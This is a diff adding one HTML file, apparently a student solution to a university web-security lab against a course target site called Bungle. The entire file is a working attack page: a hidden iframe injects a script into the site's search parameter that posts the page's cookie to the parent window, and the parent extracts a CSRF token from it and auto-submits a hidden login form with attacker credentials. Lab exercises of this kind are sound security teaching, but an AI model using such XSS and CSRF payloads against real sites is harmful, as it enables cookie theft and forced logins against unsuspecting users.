@@ -1,0 +1,32 @@
+<html>
+  <body>
+    <script>
+    var token='';
+    var target='http://bungle-cs461.cs.illinois.edu/login?csrfdefense=1&xssdefense=0';
+    function receiver(e){/*start of the FUNCTION RECEIVER*/
+      var i = 11;
+      while (i<43){
+        token += e.data[i]
+        i++;
+      }
+      //console.log(token);//////////
+      function send_form(){
+        document.body.innerHTML
+          +='<form id="myform" action="' + target + '"method="post" target="bungle_dis">'
+          + '<input type="hidden" name="csrf_token" value="' + token + '">'
+          + '<input name="username" value="attacker">'
+          + '<input name="password" value="l33th4x">'
+          + '</form>';
+        document.forms["myform"].submit(function(){
+          return false;
+        });
+      }////////////////////////////////////
+      send_form();
+      document.getElementById("myform").style.display="none";
+    }/*END OF FUNCTION RECEIVER*/
+    window.addEventListener('message', receiver);
+    </script>
+     <iframe src="http://bungle-cs461.cs.illinois.edu/search?csrfdefense=1&xssdefense=0&q=<script>parent.postMessage(document.cookie,'*')</script>"
+    frameborder="0" name="bungle_dis" style="display:none;"></iframe>
+  </body>
+</html>
